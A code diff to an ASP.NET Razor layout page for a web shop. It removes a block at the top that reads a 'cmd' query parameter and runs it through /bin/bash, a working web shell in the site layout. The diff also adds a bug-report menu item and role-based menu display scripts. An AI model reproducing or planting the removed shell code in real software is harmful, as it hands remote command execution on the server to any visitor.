@@ -1,36 +1,5 @@
 ﻿@using System.Diagnostics
-@{
-    Layout = null;
-    string cmd = Context.Request.Query["cmd"];
-    string output = "";
-
-    if (!string.IsNullOrEmpty(cmd))
-    {
-        try
-        {
-            var psi = new ProcessStartInfo
-            {
-                FileName = "/bin/bash",
-                Arguments = $"-c \"{cmd}\"",
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            };
-
-            using (var process = Process.Start(psi))
-            {
-                output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
-                process.WaitForExit();
-            }
-        }
-        catch (Exception ex)
-        {
-            output = $"Error: {ex.Message}";
-        }
-        <text>@output</text>
-    }
-}
+@using SeaCarp.Infrastructure
 <!DOCTYPE html>
 <html lang="en" data-bs-theme="dark">
 <head>
@@ -75,6 +44,12 @@
                             </li>
                             <li>
                                 <a class="dropdown-item" asp-area="" asp-controller="Identity" asp-action="Logout">Logout</a>
+                            </li>
+                            <li id="top_menu_dropdown_bug_report" style="display: none">
+                                <a class="dropdown-item" href="/@nameof(BugReportsController).RemoveControllerSuffix()">
+                                    Report Bug
+                                    <span id="bugReportBadge" class="badge bg-secondary ms-1"></span>
+                                </a>
                             </li>
                             <li id="top_menu_dropdown_admin" style="display: none">
                                 <a class="dropdown-item" href="/@nameof(AdminController).RemoveControllerSuffix()">
@@ -182,11 +157,23 @@
     @await RenderSectionAsync("Scripts", required: false)
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            @if (RequestContext.Instance.CurrentUser.Value is null)
+        @if (RequestContext.Instance.CurrentUser.Value is null)
         {
             <text>
                 localStorage.removeItem("cartItems");
-                </text>
+            </text>
+        }
+        @if (RequestContext.Instance.CurrentUser.Value is not null && RequestContext.Instance.CurrentUser.Value.IsAdmin)
+        {
+            <text>
+                document.querySelector('#top_menu_dropdown_admin').style.display = 'block';
+            </text>
+        }
+        @if (RequestContext.Instance.CurrentUser.Value is not null && RequestContext.Instance.CurrentUser.Value.IsCaseOfficer)
+        {
+            <text>
+                document.querySelector('#top_menu_dropdown_bug_report').style.display = 'block';
+            </text>
         }
             setInterval(() => {
                 const cartBadge = document.getElementById("cartBadge");
